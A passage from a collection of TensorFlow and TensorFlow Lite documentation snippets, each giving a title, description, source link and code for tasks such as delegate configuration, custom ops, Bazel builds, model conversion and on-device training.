
LANGUAGE: Kotlin
CODE:
```
val interpreterTask = useGpuTask.continueWith { task ->
  val interpreterOptions = InterpreterApi.Options()
      .setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY)
  if (task.result) {
      interpreterOptions.addDelegateFactory(GpuDelegateFactory())
  }
  InterpreterApi.create(FileUtil.loadMappedFile(context, MODEL_PATH), interpreterOptions)
}
```

----------------------------------------

TITLE: Getting Output Tensor Types TFLite Python
DESCRIPTION: This snippet provides the Python function signature for `get_output_tensor_types`. It shows that the function takes a `bytearray` representing the TFLite model buffer as input and returns a list of `_schema_fb.TensorType` objects, indicating the data types of the model's output tensors. This is useful for programmatically inspecting the output format of a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/get_output_tensor_types.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.writer_utils.get_output_tensor_types(
    model_buffer: bytearray
) -> List[_schema_fb.TensorType]
```

----------------------------------------

TITLE: Initializing AudioClassifier with TensorFlow Lite Model Maker (Python)
DESCRIPTION: Initializes a new instance of the AudioClassifier class. This constructor takes parameters defining the model architecture, how labels are mapped, whether to shuffle data during training, and whether to train the entire model or just the top classification layer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.audio_classifier.AudioClassifier(
    model_spec, index_to_label, shuffle, train_whole_model
)
```

----------------------------------------

TITLE: Configuring Core ML Delegate in TFLite ImageClassifier C++
DESCRIPTION: This C++ snippet demonstrates how to initialize the TFLite ImageClassifier task with the Core ML delegate enabled. It configures the base options to load the model, sets the delegate type to CORE_ML, and specifies enabled devices to include all compatible devices.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_10

LANGUAGE: C++
CODE:
```
// Initialization
ImageClassifierOptions options;
// Load the TFLite model.
options.mutable_base_options()->mutable_model_file()->set_file_name(model_file);
// Turn on Core ML delegation.
options.mutable_base_options()->mutable_compute_settings()->mutable_tflite_settings()->set_delegate(::tflite::proto::Delegate::CORE_ML);
// Set DEVICES_ALL to enable Core ML delegation on any device (in contrast to
// DEVICES_WITH_NEURAL_ENGINE which creates Core ML delegate only on devices
// with Apple Neural Engine).
options.mutable_base_options()->mutable_compute_settings()->mutable_tflite_settings()->mutable_coreml_settings()->set_enabled_devices(::tflite::proto::CoreMLSettings::DEVICES_ALL);
// Create ImageClassifier from options.
std::unique_ptr<ImageClassifier> image_classifier = ImageClassifier::CreateFromOptions(options).value();

// Run inference on Core ML.
const ClassificationResult result = image_classifier->Classify(*frame_buffer).value();
```

----------------------------------------

TITLE: Using Simple Hash Table Custom Op in Python
DESCRIPTION: Shows how to create and interact with the custom `SimpleHashTable` using its Python wrapper. It demonstrates creating the table with specified key/value types and a default value, finding a key (initially returning the default), inserting a key-value pair, and then finding the key again to retrieve the stored value. Requires the `simple_hash_table_op` module.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_1

LANGUAGE: python
CODE:
```
hash_table = simple_hash_table_op.SimpleHashTable(tf.int32, float,
                                                  default_value=-999.0)
result1 = hash_table.find(key=1, dynamic_default_value=-999.0)
# -999.0
hash_table.insert(key=1, value=100.0)
result2 = hash_table.find(key=1, dynamic_default_value=-999.0)
# 100.0
```

----------------------------------------

TITLE: Splitting Image Dataset into Train/Test (Python)
DESCRIPTION: Defines the `split_into_train_test` function. This function takes a directory of images sorted by class and splits them into 'train' and 'test' directories based on a specified `test_split` ratio. It includes deterministic shuffling and handles common image file types.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_6

LANGUAGE: Python
CODE:
```
#@markdown Be sure you run this cell. It's hiding the `split_into_train_test()` function that's called in the next code block.

import os
import random
import shutil

def split_into_train_test(images_origin, images_dest, test_split):
  """Splits a directory of sorted images into training and test sets.

  Args:
    images_origin: Path to the directory with your images. This directory
      must include subdirectories for each of your labeled classes. For example:
      yoga_poses/
      |__ downdog/
          |______ 00000128.jpg
          |______ 00000181.jpg
          |______ ...
      |__ goddess/
          |______ 00000243.jpg
          |______ 00000306.jpg
          |______ ...
      ...
    images_dest: Path to a directory where you want the split dataset to be
      saved. The results looks like this:
      split_yoga_poses/
      |__ train/
          |__ downdog/
              |______ 00000128.jpg
              |______ ...
      |__ test/
          |__ downdog/
              |______ 00000181.jpg
              |______ ...
    test_split: Fraction of data to reserve for test (float between 0 and 1).
  """
  _, dirs, _ = next(os.walk(images_origin))

  TRAIN_DIR = os.path.join(images_dest, 'train')
  TEST_DIR = os.path.join(images_dest, 'test')
  os.makedirs(TRAIN_DIR, exist_ok=True)
  os.makedirs(TEST_DIR, exist_ok=True)

  for dir in dirs:
    # Get all filenames for this dir, filtered by filetype
    filenames = os.listdir(os.path.join(images_origin, dir))
    filenames = [os.path.join(images_origin, dir, f) for f in filenames if (
        f.endswith('.png') or f.endswith('.jpg') or f.endswith('.jpeg') or f.endswith('.bmp'))]
    # Shuffle the files, deterministically
    filenames.sort()
    random.seed(42)
    random.shuffle(filenames)
    # Divide them into train/test dirs
    os.makedirs(os.path.join(TEST_DIR, dir), exist_ok=True)
    os.makedirs(os.path.join(TRAIN_DIR, dir), exist_ok=True)
    test_count = int(len(filenames) * test_split)
    for i, file in enumerate(filenames):
      if i < test_count:
        destination = os.path.join(TEST_DIR, dir, os.path.split(file)[1])
      else:
        destination = os.path.join(TRAIN_DIR, dir, os.path.split(file)[1])
      shutil.copyfile(file, destination)
    print(f'Moved {test_count} of {len(filenames)} from class "{dir}" into test.')
  print(f'Your split dataset is in "{images_dest}"')

```

----------------------------------------

TITLE: Add TFLite Swift Dependency with Bazel (Python)
DESCRIPTION: Defines a Swift library target in a Bazel BUILD file, adding the TensorFlow Lite Swift library as a dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_5

LANGUAGE: Python
CODE:
```
swift_library(
  deps = [
      "//tensorflow/lite/swift:TensorFlowLite",
  ],
)
```

----------------------------------------

TITLE: Initialize TensorFlow Lite Quantization Debugger Python
DESCRIPTION: Initializes the `tf.lite.experimental.QuantizationDebugger` using the configured TFLiteConverter and the representative dataset. This sets up the debugger for analysis by linking it to the model and the data used for calibration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_6

LANGUAGE: Python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.representative_dataset = representative_dataset(ds)

# my_debug_dataset should have the same format as my_representative_dataset
debugger = tf.lite.experimental.QuantizationDebugger(
    converter=converter, debug_dataset=representative_dataset(ds))
```

----------------------------------------

TITLE: Evaluating TFLite Audio Model using Model Maker Python
DESCRIPTION: Evaluates the performance of the trained model on a separate test dataset. It calls the `evaluate` method on the model with the `test_data` object, providing metrics like accuracy on unseen data. Requires a trained `model` object and the `test_data`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
print('Evaluating the model')
model.evaluate(test_data)
```

----------------------------------------

TITLE: Getting Audio Sample Rate - AudioProperties Python
DESCRIPTION: Retrieves the audio sample rate from the `AudioProperties` object. This method is used to access the sample rate metadata stored within the FlatBuffers structure. It returns an integer representing the sample rate.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioProperties.md#_snippet_5

LANGUAGE: python
CODE:
```
SampleRate()
```

----------------------------------------

TITLE: Building TFLite C++ Library for AArch64 (Bazel/Bash)
DESCRIPTION: Builds the core TensorFlow Lite C++ library (`libtensorflowlite.so`) for the AArch64 architecture using Bazel. This command generates the optimized shared library for the specified ARM target platform.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_arm.md#_snippet_2

LANGUAGE: bash
CODE:
```
bazel build --config=elinux_aarch64 -c opt //tensorflow/lite:libtensorflowlite.so
```

----------------------------------------

TITLE: Initializing Recommendation ModelSpec Python
DESCRIPTION: Defines the constructor for the `ModelSpec` class, used to configure the recommendation model. It requires specifying the data input format (`input_spec`) and the model architecture hyperparameters (`model_hparams`). These parameters determine how the model processes data and its internal structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/ModelSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.recommendation.ModelSpec(\n    input_spec: tflite_model_maker.recommendation.spec.InputSpec,\n    model_hparams: tflite_model_maker.recommendation.spec.ModelHParams\n)
```

----------------------------------------

TITLE: Building Select TF Ops Framework for iOS - Bazel
DESCRIPTION: This shell command uses Bazel to build the `TensorFlowLiteSelectTfOps_framework` for iOS, targeting specific architectures (arm64, x86_64), which can then be added to an Xcode project to enable select TensorFlow op support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_9

LANGUAGE: sh
CODE:
```
bazel build -c opt --config=ios --ios_multi_cpus=arm64,x86_64 \
  //tensorflow/lite/ios:TensorFlowLiteSelectTfOps_framework
```

----------------------------------------

TITLE: Initializing TFLite DetectionResult (Python)
DESCRIPTION: Documents the constructor for the TensorFlow Lite Support DetectionResult class. It requires a list of 'Detection' objects as input and represents the overall result of an object detection task.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/DetectionResult.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.DetectionResult(
    detections: List[tflite_support.task.processor.Detection]
)
```

----------------------------------------

TITLE: Implementing Custom Sequential Model Python
DESCRIPTION: This Python class composes the custom Embedding, GRU, and Dense layers into a simple sequential model. It handles building the individual layers and passing input through the sequence.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_21

LANGUAGE: python
CODE:
```
class Model:

  def __init__(self, vocab_size, embedding_dim, rnn_units, forget_bias=0.0, stateful=False, activation=None):
    self._embedding = Embedding(vocab_size, embedding_dim)
    self._gru = GRU(rnn_units, forget_bias=forget_bias, stateful=stateful)
    self._dense = Dense(vocab_size, activation=activation)
    self._layers = [self._embedding, self._gru, self._dense]
    self._built = False

  def __call__(self, inputs):
    if not self._built:
      self.build(inputs)
    xs = inputs
    for layer in self._layers:
      xs = layer(xs)
    return xs
    
  def build(self, inputs):
    self._embedding.build(inputs)
    self._gru.build(tf.TensorSpec(inputs.shape + (self._embedding._embedding_dim,), tf.float32))
    self._dense.build(tf.TensorSpec(inputs.shape + (self._gru._cell._n_units,), tf.float32))
    self._built = True

  @property
  def weights(self):
    return [layer.weights for layer in self._layers]

  @property
  def state(self):
    return self._gru.state

  def create_state(self, *args):
    self._gru.create_state(*args)

  def reset_state(self, *args):
    self._gru.reset_state(*args)
```

----------------------------------------

TITLE: Capturing Variables in AutoGraph Loop Closure Python
DESCRIPTION: Demonstrates how AutoGraph correctly captures variables from the parent scope (`a`) within a function (`f`) used after a loop implicitly converted to `tf.while_loop`. The function `f` sees the final value of `a` after the loop completes. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_19

LANGUAGE: Python
CODE:
```
a = 0
def f():
  tf.print(a)
for i in tf.range(3):
  a = i
f()  # Prints 2
```

----------------------------------------

TITLE: Creating Model with BrowserFftSpec (Python)
DESCRIPTION: Creates the core classification model using the BrowserFftSpec. Requires the number of output classes and an optional flag to train the whole model (as opposed to just the head).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_1

LANGUAGE: Python
CODE:
```
create_model(
    num_classes, train_whole_model=False
)
```

----------------------------------------

TITLE: Implementing TensorFlow Sparse Multiplex Op Kernel C++
DESCRIPTION: Defines the `MultiplexSparseOp` class, derived from `OpKernel`, which implements the core sparse multiplex logic. Its `Compute` method retrieves, validates, and processes input sparse tensors ('cond', 'a', 'b'), performs a merge operation based on the condition, allocates output sparse tensors, and populates them with selected values. It includes a helper function `ValidateSparseTensor` for input shape and dimension checks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_2

LANGUAGE: c++
CODE:
```
template <typename T>
class MultiplexSparseOp : public OpKernel {
 public:
  explicit MultiplexSparseOp(OpKernelConstruction* ctx) : OpKernel(ctx) {}
  MultiplexSparseOp(const MultiplexSparseOp& other) = delete;
  MultiplexSparseOp& operator=(const MultiplexSparseOp& other) = delete;
  ~MultiplexSparseOp() override = default;

  void Compute(OpKernelContext* ctx) override {
    const auto& cond_indices_tensor = ctx->input(0);
    const auto& cond_values_tensor = ctx->input(1);
    const auto& cond_shape_tensor = ctx->input(2);
    const auto& a_indices_tensor = ctx->input(3);
    const auto& a_values_tensor = ctx->input(4);
    const auto& a_shape_tensor = ctx->input(5);
    const auto& b_indices_tensor = ctx->input(6);
    const auto& b_values_tensor = ctx->input(7);
    const auto& b_shape_tensor = ctx->input(8);
    OP_REQUIRES_OK(ctx,
                   ValidateSparseTensor(cond_indices_tensor, cond_values_tensor,
                                        cond_shape_tensor, "cond"));
    OP_REQUIRES_OK(ctx, ValidateSparseTensor(a_indices_tensor, a_values_tensor,
                                             a_shape_tensor, "a"));
    OP_REQUIRES_OK(ctx, ValidateSparseTensor(b_indices_tensor, b_values_tensor,
                                             b_shape_tensor, "b"));
    OP_REQUIRES(
        ctx, cond_shape_tensor.shape() == a_shape_tensor.shape(),
        InvalidArgument("Sparse tensors must be the same shape. cond_shape: ",
                        cond_shape_tensor.shape().DebugString(),
                        " vs a_shape: ", a_shape_tensor.shape().DebugString()));
    OP_REQUIRES(
        ctx, a_shape_tensor.shape() == b_shape_tensor.shape(),
        InvalidArgument("Sparse tensors must be the same shape. a_shape: ",
                        a_shape_tensor.shape().DebugString(),
                        " vs b_shape: ", b_shape_tensor.shape().DebugString()));
    const int rank = a_shape_tensor.dim_size(0);
    OP_REQUIRES(
        ctx, rank == 1,
        InvalidArgument("Sorry, multiplex for sparse tensors only "
                        "supports rank 1 tensors to simplify this example."));
    const int cond_elements = cond_indices_tensor.dim_size(0);
    const int a_elements = a_indices_tensor.dim_size(0);
    const int b_elements = b_indices_tensor.dim_size(0);
    const auto cond_indices = cond_indices_tensor.matrix<int64_t>();
    const auto cond_values = cond_values_tensor.flat<bool>();
    const auto cond_shape = cond_shape_tensor.flat<int64_t>();
    const auto a_indices = a_indices_tensor.matrix<int64_t>();
    const auto a_values = a_values_tensor.flat<T>();
    const auto a_shape = a_shape_tensor.flat<int64_t>();
    const auto b_indices = b_indices_tensor.matrix<int64_t>();
    const auto b_values = b_values_tensor.flat<T>();
    const auto b_shape = b_shape_tensor.flat<int64_t>();
    int cond_index = 0;
    int a_index = 0;
    int b_index = 0;
    // This vector is a list of source tensors (a = true, b = false) and source
    // indices.
    std::vector<std::pair<bool, int>> merged_output;
    merged_output.reserve(std::min(cond_elements, a_elements) + b_elements);
    while (a_index < a_elements || b_index < b_elements) {
      // Determine the whether the current location with values has a value
      // for `a`, for `b` or for both `a` and `b`.
      int64_t cur_row;
      bool is_a_at_cur = false;
      bool is_b_at_cur = false;
      if (a_index < a_elements && b_index < b_elements) {
        const int64_t a_row = a_indices(a_index, 0);
        const int64_t b_row = b_indices(b_index, 0);
        cur_row = std::min(a_row, b_row);
        if (a_row == cur_row) {
          is_a_at_cur = true;
        }
        if (b_row == cur_row) {
          is_b_at_cur = true;
        }
      } else if (a_index < a_elements) {
        cur_row = a_indices(a_index, 0);
        is_a_at_cur = true;
      } else {  // b_index < b_elements
        cur_row = b_indices(b_index, 0);
        is_b_at_cur = true;
      }
      // Determine if `cond` has a value at the current location
      bool cond_flag = false;
      while (cond_index < cond_elements) {
        const int64_t cond_row = cond_indices(cond_index, 0);
        if (cond_row > cur_row) {
          break;
        }
        if (cond_row == cur_row) {
          cond_flag = cond_values(cond_index);
          break;
        }
        ++cond_index;
      }
      // Add `a` or `b` to the merged output based on the condition
      if (is_a_at_cur) {
        if (cond_flag) {
          merged_output.emplace_back(true, a_index);
        }
        ++a_index;
      }
      if (is_b_at_cur) {
        if (!cond_flag) {
          merged_output.emplace_back(false, b_index);
        }
        ++b_index;
      }
    }

    // Allocate output tensors.
    Tensor* output_indices_tensor;
    Tensor* output_values_tensor;
    Tensor* output_dense_shape_tensor;
    const int num_values = merged_output.size();
    OP_REQUIRES_OK(ctx, ctx->allocate_output(0, TensorShape({num_values, rank}),
                                             &output_indices_tensor));
    OP_REQUIRES_OK(ctx, ctx->allocate_output(1, TensorShape({num_values}),
                                             &output_values_tensor));
    OP_REQUIRES_OK(ctx, ctx->allocate_output(2, TensorShape({rank}),
                                             &output_dense_shape_tensor));
    auto output_indices = output_indices_tensor->matrix<int64_t>();
    auto output_values = output_values_tensor->flat<T>();
    auto output_shape = output_dense_shape_tensor->flat<int64_t>();
    for (int row = 0; row < num_values; ++row) {
      const auto& source_flag = merged_output[row].first;
      const auto& source_row = merged_output[row].second;
      const auto& indices = source_flag ? a_indices : b_indices;
      const auto& values = source_flag ? a_values : b_values;
      for (int column = 0; column < rank; ++column) {
        output_indices(row, column) = indices(source_row, column);
      }
      output_values(row) = values(source_row);
    }
    // Expand the shape of the output sparse tensor so that it is as large
    // as the shape of the largest input in each dimension.
    // An alternative behavior would be to require that the shapes be the
    // same and implement error checking that all the corresponding values
    // in the shape tensors are the same (e.g.
    // `cond_shape(i) == a_shape(i)` and `a_shape(i) == b_shape(i)` in
    // OP_REQUIRES above and `output_shape(i) = a_shape(i)` here).
    for (int i = 0; i < rank; ++i) {
      output_shape(i) =
          std::max(cond_shape(i), std::max(a_shape(i), b_shape(i)));
    }
  }

 private:
  Status ValidateSparseTensor(const ::tensorflow::Tensor& indices_tensor,
                              const ::tensorflow::Tensor& values_tensor,
                              const ::tensorflow::Tensor& shape_tensor,
                              const string label) {
    if (!TensorShapeUtils::IsMatrix(indices_tensor.shape())) {
      return InvalidArgument(
          "Sparse indices for ", label,
          " must be rank 2, not shape: ", indices_tensor.shape().DebugString());
    }
    if (!TensorShapeUtils::IsVector(values_tensor.shape())) {
      return InvalidArgument("Sparse values for ", label,
                             " must be a vector, not shape: ",
                             values_tensor.shape().DebugString());
    }
    if (!TensorShapeUtils::IsVector(shape_tensor.shape())) {
      return InvalidArgument(
          "Sparse shape for ", label,
          " must be a vector, not shape: ", shape_tensor.shape().DebugString());
    }
    if (indices_tensor.dim_size(0) != values_tensor.dim_size(0)) {
      return InvalidArgument("Sparse indices and values for " + label +
                                 " must have the same "
                                 "number of rows. indices: ",
                             indices_tensor.shape().DebugString(),
                             " values: ", values_tensor.shape().DebugString());
    }
    return OkStatus();
  }
};
```

----------------------------------------

TITLE: Defining TensorFlow Lite Model Constants - Kotlin
DESCRIPTION: Defines constant values within a companion object for specifying delegate types (CPU, NNAPI) and the filenames of the TensorFlow Lite models (`.tflite`) located in the assets directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_3

LANGUAGE: Kotlin
CODE:
```
companion object {
  const val DELEGATE_CPU = 0
  const val DELEGATE_NNAPI = 1
  const val WORD_VEC = "wordvec.tflite"
  const val MOBILEBERT = "mobilebert.tflite"
}
```

----------------------------------------

TITLE: Testing TensorFlow Hash Table Insert and Find (Python)
DESCRIPTION: This test demonstrates the basic functionality of the `SimpleHashTable` in eager execution. It creates a table, attempts to find a non-existent key (expecting the default), inserts a key-value pair, and then finds the inserted key again (expecting the inserted value), asserting the results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_18

LANGUAGE: Python
CODE:
```
  def test_find_insert_find_strings_eager(self):
    default = 'Default'
    foo = 'Foo'
    bar = 'Bar'
    hash_table = simple_hash_table.SimpleHashTable(tf.string, tf.string,
                                                   default)
    result1 = hash_table.find(foo, default)
    self.assertEqual(result1, default)
    hash_table.insert(foo, bar)
    result2 = hash_table.find(foo, default)
    self.assertEqual(result2, bar)
```

----------------------------------------

TITLE: Adding Hexagon Delegate Gradle Dependencies
DESCRIPTION: Specifies the necessary Gradle dependencies to include the TensorFlow Lite core library and the Hexagon delegate AAR in an Android project's build.gradle file, typically using nightly snapshots.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/hexagon.md#_snippet_1

LANGUAGE: Gradle
CODE:
```
dependencies {
  ...
  implementation 'org.tensorflow:tensorflow-lite:0.0.0-nightly-SNAPSHOT'
  implementation 'org.tensorflow:tensorflow-lite-hexagon:0.0.0-nightly-SNAPSHOT'
}
```

----------------------------------------

TITLE: Adding GPU Delegate Dependency (C++ Bazel)
DESCRIPTION: This C++ snippet shows the Bazel build dependency needed to include the TensorFlow Lite GPU delegate plugin in your project. It highlights the specific target `//tensorflow_lite_support/acceleration/configuration:gpu_plugin` required for GPU acceleration and mentions other delegate plugin options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_2

LANGUAGE: C++
CODE:
```
deps = [
  "//tensorflow_lite_support/acceleration/configuration:gpu_plugin", # for GPU
]
```

----------------------------------------

TITLE: Running TensorFlow ResNet50 Benchmarks (Python)
DESCRIPTION: Commands to execute the ResNet50 benchmark scripts (`resnet50_test.py` for eager execution and `resnet50_graph_test.py` for graph execution) using the standard Python interpreter. The `--benchmark_filter=.` argument runs all available benchmarks. This method uses the model definition included with the installed TensorFlow pip package.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/eager/benchmarks/resnet50/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
# Using eager execution
python resnet50_test.py --benchmark_filter=.

# Using graph execution
python resnet50_graph_test.py --benchmark_filter=.
```

----------------------------------------

TITLE: Installing TFLite Support Package Python
DESCRIPTION: Installs the tflite-support Python package using pip. This package provides the necessary libraries, including the NLClassifier, for running TFLite models in Python.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/nl_classifier.md#_snippet_5

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Calling Test Function for Float and Quantized Models Python
DESCRIPTION: These lines call the `test_model` helper function to demonstrate inference on a single test image using both the float and the quantized TensorFlow Lite models. This allows for a visual comparison of the prediction accuracy for a specific example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_12

LANGUAGE: Python
CODE:
```
test_model(tflite_model_file, test_image_index, model_type="Float")
```

LANGUAGE: Python
CODE:
```
test_model(tflite_model_quant_file, test_image_index, model_type="Quantized")
```

----------------------------------------

TITLE: Getting Root AudioProperties from Buffer in Python
DESCRIPTION: Retrieves the root `AudioProperties` object from a FlatBuffers buffer. This class method is the primary way to parse a buffer containing `AudioProperties` data. It takes the buffer and an optional offset, returning an instance of the `AudioProperties` class initialized with the buffer's data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioProperties.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Building Selective TensorFlow Lite AAR for Android (Shell)
DESCRIPTION: This shell command uses the `build_aar.sh` script to generate a custom TensorFlow Lite Android Archive (AAR) file. It takes a comma-separated list of TensorFlow Lite model file paths via `--input_models` and specifies the target architectures via `--target_archs`. The output is a potentially 'fat' AAR containing only the ops required by the specified models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_0

LANGUAGE: sh
CODE:
```
sh tensorflow/lite/tools/build_aar.sh \
  --input_models=/a/b/model_one.tflite,/c/d/model_two.tflite \
  --target_archs=x86,x86_64,arm64-v8a,armeabi-v7a
```

----------------------------------------

TITLE: Initializing ImageDataLoader Python
DESCRIPTION: Initializes an instance of the ImageDataLoader class. It requires an `ImageEmbedder` instance to generate embeddings and can optionally specify the method for loading metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ImageDataLoader.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.searcher.ImageDataLoader(
    embedder: image_embedder.ImageEmbedder,
    metadata_type: tflite_model_maker.searcher.MetadataType = tflite_model_maker.searcher.MetadataType.FROM_FILE_NAME
) -> None
```

----------------------------------------

TITLE: Selecting Data from Record in TensorFlow
DESCRIPTION: Processes a single record (e.g., from a TFRecord file) and separates it into features and corresponding labels. This is part of the data loading and preprocessing pipeline.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_13

LANGUAGE: python
CODE:
```
select_data_from_record(
    record
)

```

----------------------------------------

TITLE: Optimize TensorFlow Graph for Deployment (Bash)
DESCRIPTION: This command applies a recommended sequence of transformations designed to optimize a TensorFlow graph for deployment environments like servers or mobile. Transforms include removing unused nodes, removing specific ops, folding constants, and folding both old and new styles of batch normalization to improve performance and reduce file size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=tensorflow_inception_graph.pb \
--out_graph=optimized_inception_graph.pb \
--inputs='Mul' \
--outputs='softmax' \
--transforms='
  strip_unused_nodes(type=float, shape="1,299,299,3")
  remove_nodes(op=Identity, op=CheckNumerics)
  fold_constants(ignore_errors=true)
  fold_batch_norms
  fold_old_batch_norms
'
```

----------------------------------------

TITLE: Composing Keras Layers with TF NumPy
DESCRIPTION: Creates a Keras Sequential model that combines a standard `Dense` layer with the custom `ProjectionLayer` defined using TF NumPy. The model's `call` method is then invoked with both TF NumPy ND Array and `tf.Tensor` inputs to show that the composition works seamlessly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
batch_size = 3
units = 5
model = tf.keras.Sequential([tf.keras.layers.Dense(units),
                             ProjectionLayer(2)])

print("Calling with ND Array inputs")
tnp_inputs = tnp.random.randn(batch_size, units).astype(tnp.float32)
output = model.call(tnp_inputs)
print("Output shape %s.\nOutput class: %s\n" % (output.shape, output.__class__))

print("Calling with tensor inputs")
tf_inputs = tf.convert_to_tensor(tnp_inputs)
output = model.call(tf_inputs)
print("Output shape %s.\nOutput class: %s" % (output.shape, output.__class__))
```

----------------------------------------

TITLE: Performing On-Device Training Python
DESCRIPTION: Demonstrates how to perform model training using the TensorFlow Lite Python API's signature runner for the 'train' signature. It runs training for a specified number of epochs, processing data in batches and reporting the loss periodically.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
train = interpreter.get_signature_runner("train")

NUM_EPOCHS = 50
BATCH_SIZE = 100
more_epochs = np.arange(epochs[-1]+1, epochs[-1] + NUM_EPOCHS + 1, 1)
more_losses = np.zeros([NUM_EPOCHS])


for i in range(NUM_EPOCHS):
  for x,y in train_ds:
    result = train(x=x, y=y)
  more_losses[i] = result['loss']
  if (i + 1) % 10 == 0:
    print(f"Finished {i+1} epochs")
    print(f"  loss: {more_losses[i]:.3f}")
```

----------------------------------------

TITLE: Profiling Time in Library Code (tfprof)
DESCRIPTION: This tfprof command profiles time aggregated by Python code lines, starting from the `.*_add_seq2seq.*` pattern. It limits the depth to 5, selects and orders by `micros`, and importantly, filters results to only include nodes with a minimum execution time of 100,000 microseconds (100ms), helping to identify expensive operations or functions within library calls. Requires `--graph_path`, `--op_log_path`, and `--run_meta_path`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_2

LANGUAGE: tfprof
CODE:
```
tfprof> code -max_depth 5 -select micros -order_by micros -start_name_regexes .*_add_seq2seq.* -min_micros 100000
```

----------------------------------------

TITLE: Converting Session GraphDef to TFLite in Python
DESCRIPTION: This snippet illustrates how to convert a TensorFlow GraphDef from a live `tf.Session` object into a TensorFlow Lite model. It defines a simple graph with placeholders and variables, initializes them within a session, and then uses `tf.compat.v1.lite.TFLiteConverter.from_session` specifying the input and output tensors to perform the conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/python_api.md#_snippet_3

LANGUAGE: python
CODE:
```
import tensorflow as tf

img = tf.placeholder(name='img', dtype=tf.float32, shape=(1, 64, 64, 3))
var = tf.get_variable('weights', dtype=tf.float32, shape=(1, 64, 64, 3))
val = img + var
out = tf.identity(val, name='out')

with tf.Session() as sess:
